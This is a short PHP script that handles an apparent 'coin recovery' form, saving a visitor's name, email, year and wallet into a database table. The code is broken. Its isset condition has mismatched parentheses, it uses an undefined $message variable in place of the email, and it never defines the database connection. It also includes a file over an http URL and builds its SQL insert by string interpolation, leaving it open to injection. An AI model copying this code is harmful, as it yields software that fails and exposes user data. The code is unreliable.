<?php  


if (isset($_POST['name']) && isset($_POST['email']
    && isset($_POST['year'] && isset($_POST['wallet']
    )) {
	include 'http://localhost/coinrecovery/recover.php';

	function validate($data){
       $data = trim($data);
	   $data = stripslashes($data);
	   $data = htmlspecialchars($data);
	   return $data;
	}

	$name = validate($_POST['name']);
	$email = validate($_POST['email']);
    $year = validate($_POST['year']);
	$wallet = validate($_POST['wallet']);

	if (empty($message) || empty($name)) {
		header("Location: index.html");
	}else {

		$sql = "INSERT INTO coin22(name, email, year, wallet) VALUES('$name', '$message', '$year', '$wallet')";
		$res = mysqli_query($conn, $sql);

		if ($res) {
			echo "Your message was sent successfully!";
		}else {
			echo "Your message could not be sent!";
		}
	}

}else {
	header("Location: index.html");
}
